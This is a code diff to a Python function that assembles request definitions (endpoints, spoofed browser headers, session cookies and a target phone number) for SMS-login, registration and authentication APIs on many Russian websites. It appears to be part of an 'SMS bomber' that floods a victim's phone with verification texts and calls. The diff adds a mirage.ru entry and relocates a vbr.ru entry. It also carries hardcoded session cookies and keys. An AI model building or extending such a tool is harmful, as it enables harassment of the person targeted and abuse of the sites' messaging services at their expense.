@@ -9,13 +9,21 @@ def urls(number):
         {
             "info": {"type": "sms"},
             "method": "post",
+            "url": "https://www.mirage.ru/login2/1/",
+            "headers": { 'User-Agent': ua.random, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.mirage.ru', 'Referer': 'https://www.mirage.ru/login3/', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', },
+            "cookies": { 'PHPSESSID': '49g7vvvgp2djfnu1udn2o798ef', },
+            "data": f"t=69f33d05852fa&actl=resend&phone=%2B7+{number[1:4]}+{number[4:7]}-{number[7:9]}-{number[9:11]}",
+        },
+        {
+            "info": {"type": "sms"},
+            "method": "post",
             "url": "https://niyama.ru/api/auth/",
             "headers": { 'User-Agent': ua.random, 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.5', 'X-SOURCE': 'site', 'Content-Type': 'application/json', 'Origin': 'https://niyama.ru', 'DNT': '1', 'Connection': 'keep-alive', 'Referer': 'https://niyama.ru/menu/pitstsa_30_sm/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', },
             "cookies": { 'auth.strategy': 'local', },
             "json": { 'phone': number, 'recaptcha': 1, },
         },
         {
-            'info': {"type":"banner"},
+            "info": {"type":"banner"},
             'method': 'post',
             "url": 'https://rest.beeline.tv/api_v3/service/ottUser/action/login',
             "headers": {'Accept': 'application/json', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-type': 'application/json', 'Origin': 'https://beeline.tv', 'Referer': 'https://beeline.tv/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': ua.random, 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
@@ -298,13 +306,6 @@ def urls(number):
         },
         {
             "method":"post",
-            "url":"https://identity.vbr.ru/mobileid/authorization/start/",
-            "headers":{'User-Agent': ua.random, 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.vbr.ru/', 'Content-Type': 'application/json', 'Origin': 'https://www.vbr.ru', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'Priority': 'u=0',},
-            "json":{'phone': f"+{number[0]} ({number[1:4]}) {number[4:7]}-{number[7:]}", 'consent': { 'termsOfUseConsent': True, 'conditionsForTransferringInformationConsent': True, 'loyaltyProgramConsent': True, },},
-            "cookies":{'qrator_ssid': '1776356860.510.pIAvyJyFf2ELaK6N-4s894fq6mm7pk3ocqhad0a8uh0vp1t5o', 'puid': '8295dc618b21452882aa27f08e71f209', '_ym_uid': '1776356862599015303', '_ym_d': '1776356862', 'MyRegion': 'www', '_ym_isad': '2', 'AuthSessionId': '615a843c-3266-473d-bdfc-7ced3bce8265',},
-        },
-        {
-            "method":"post",
             "url":"https://sushiman75.ru/api/user/register",
             "cookies":{ 'uuid': '6f582446-f961-2192-a134-3bd04c072912', 'encodedIP': 'dKlKmBfXaAnAaAtRdWfFoLrTmB', 'i18n_redirected': 'ru', 'theme': 'light', 'city_id': '1', 'department_id': '0', 'delivery_type': 'delivery', '__session__id': '183984034469ee4daec0df94.02819077', },
             "headers":{ 'User-Agent': ua.random, 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://sushiman75.ru/', 'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=dc910e7ccc6b4339b11b1c5cdad4d62d,sentry-org_id=4504076812025856,sentry-transaction=%2F,sentry-sampled=true,sentry-sample_rand=0.09459801085004338,sentry-sample_rate=0.25', 'content-type': 'application/json', 'sentry-trace': 'dc910e7ccc6b4339b11b1c5cdad4d62d-a920f2c9a4a0baca-1', 'sitenew': '1', 'uuid': '6f582446-f961-2192-a134-3bd04c072912', 'x-api-key': '2442642', 'x-brand-id': '1', 'x-platform': 'ssr', 'Origin': 'https://sushiman75.ru', 'DNT': '1', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'Priority': 'u=0', },
@@ -412,6 +413,14 @@ def urls(number):
             "url": f"https://vsem-edu-oblako.ru/singlemerchant/api/customerRegister?device_id=dac08872-f08a-41b0-bc28-1e5347fc2311&device_platform=desktop&merchant_keys=969a8f7aba236238a9eb6ea0ead4e76b&transaction_type=delivery&json=true&lang=ru&frontend=modern&contact_phone=%2B7+({number[1:4]})+{number[4:7]}-{number[7:9]}-{number[9:11]}&password=qwerty123&cpassword=qwerty123",
             "headers": { 'User-Agent': ua.random, 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://xn--80aafgeg5a3afligjeg0r.xn--p1ai/', 'Origin': 'https://xn--80aafgeg5a3afligjeg0r.xn--p1ai', 'DNT': '1', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', },
             "cookies": None,
+        },
+        {
+            "info": {"type":"banner"},
+            "method":"post",
+            "url":"https://identity.vbr.ru/mobileid/authorization/start/",
+            "headers":{'User-Agent': ua.random, 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.vbr.ru/', 'Content-Type': 'application/json', 'Origin': 'https://www.vbr.ru', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'Priority': 'u=0',},
+            "json":{'phone': f"+{number[0]} ({number[1:4]}) {number[4:7]}-{number[7:]}", 'consent': { 'termsOfUseConsent': True, 'conditionsForTransferringInformationConsent': True, 'loyaltyProgramConsent': True, },},
+            "cookies":{'qrator_ssid': '1776356860.510.pIAvyJyFf2ELaK6N-4s894fq6mm7pk3ocqhad0a8uh0vp1t5o', 'puid': '8295dc618b21452882aa27f08e71f209', '_ym_uid': '1776356862599015303', '_ym_d': '1776356862', 'MyRegion': 'www', '_ym_isad': '2', 'AuthSessionId': '615a843c-3266-473d-bdfc-7ced3bce8265',},
         },
         {
             "method": "get",
